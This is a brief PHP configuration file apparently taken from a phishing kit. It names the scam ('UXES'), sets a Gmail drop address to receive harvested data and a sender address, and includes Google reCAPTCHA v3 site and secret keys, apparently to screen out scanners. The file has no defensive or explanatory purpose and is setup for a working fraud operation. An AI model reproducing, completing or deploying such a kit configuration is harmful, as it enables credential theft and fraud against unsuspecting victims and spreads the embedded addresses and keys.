<?php
////////////////////////////////////////
$scamname = "UXES";	
// ================================== //
$send   = "brownsmowervet@gmail.com";
// ================================== //
$sendfrom   = "contactxx@csicable.net";
// ================================== //
$use_captchaa = "yes"; // Use Advance Google V3 Security yes or no // for advance users only...//don't change if u dont understand
// ================================== //
$captcha_site_key = "6LdZxQEVAAAAAAZyu_QKXAwC_5GB8yR8bNzpiZ5N";   // Put here Google Recaptcha V3 Public Key
$captcha_secret_key = "6LdZxQEVAAAAAI5iChpz2Tbse7Gcg6j_m-D8DvM4"; // Put here Google Recaptcha V3 Secret Key
$show_captchaa = "yes"; // Use Captcha |yes| or |no|
define("EMAIL", "$ur_email");


// ================================== //
?>